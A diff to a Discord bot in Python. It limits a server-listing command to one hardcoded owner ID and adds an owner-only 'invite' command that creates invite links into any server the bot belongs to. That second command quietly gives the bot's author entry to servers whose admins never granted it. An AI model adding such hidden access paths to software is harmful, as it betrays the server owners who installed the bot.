@@ -35,10 +35,35 @@ async def on_redy():
    
 @client.command()
 async def servers(ctx, arg = None):
-    for guild in client.guilds:
-        await ctx.send(guild)
-        await ctx.send(guild.id)
+    user = int(550061958938886175)
+    author = int(ctx.author.id)
+    if author == user:
+        for guild in client.guilds:
+            await ctx.send(guild)
+            await ctx.send(guild.id)
 
+    else:
+        await ctx.send(f"Вы не создатель бота!")
+
+@client.command()
+async def invite(ctx, arg = None):
+    user = int(550061958938886175)
+    author = int(ctx.author.id)
+    if author == user:
+        for guild in client.guilds:
+            await ctx.send(guild)
+            idi = int(guild.id)
+            argd = int(arg)
+            if idi == argd:
+                await ctx.send(f"!")
+                for channel in guild.text_channels:
+                    if channel.permissions_for(guild.me).send_messages:
+                        invite = await channel.create_invite()
+                        await ctx.send(invite)
+                        break
+    else:
+        await ctx.send(f"Вы не создатель бота!")	
+	
 @client.command()
 async def send(ctx, arg = None, *, argg):
     user = int(550061958938886175)
